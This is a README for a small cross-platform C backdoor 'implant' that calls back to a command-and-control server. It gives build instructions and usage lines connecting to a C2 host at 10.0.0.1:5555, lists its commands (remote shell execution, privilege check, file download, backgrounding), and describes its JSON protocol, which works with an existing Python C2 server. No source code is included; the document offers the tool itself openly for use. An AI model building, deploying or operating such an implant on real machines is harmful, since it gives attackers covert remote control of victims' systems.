# C-implant

Native cross-platform C agent for reverse-backdoor.

## Build

```bash
# Linux only
make linux

# Windows only (requires mingw-w64)
make windows

# Both
make
```

## Usage

```bash
./agent_linux 10.0.0.1 5555        # Connect to C2 on port 5555
./agent_linux 10.0.0.1 5555 10     # 10 sec reconnect interval
```

## Size

```
Linux:   ~8-15 KB (stripped)
Windows: ~10-18 KB (stripped)
```

vs Python agent: ~7-10 MB (PyInstaller)

## Supported commands

| Command | Linux | Windows |
|---------|:-----:|:-------:|
| Shell exec | ✅ | ✅ |
| sysinfo | ✅ | ✅ |
| ls | ✅ (ls -la) | ✅ (dir) |
| cd | ✅ | ✅ |
| pwd | ✅ | ✅ |
| check_admin | ✅ | ✅ |
| download | ✅ | ✅ |
| quit | ✅ | ✅ |
| background | ✅ | ✅ |

## Protocol

Same JSON newline-delimited protocol as Python agent. Compatible with the existing Python C2 server.

```
→ {"command": "sysinfo"}
← {"response": "Operating System: Linux 6.1..."}
```
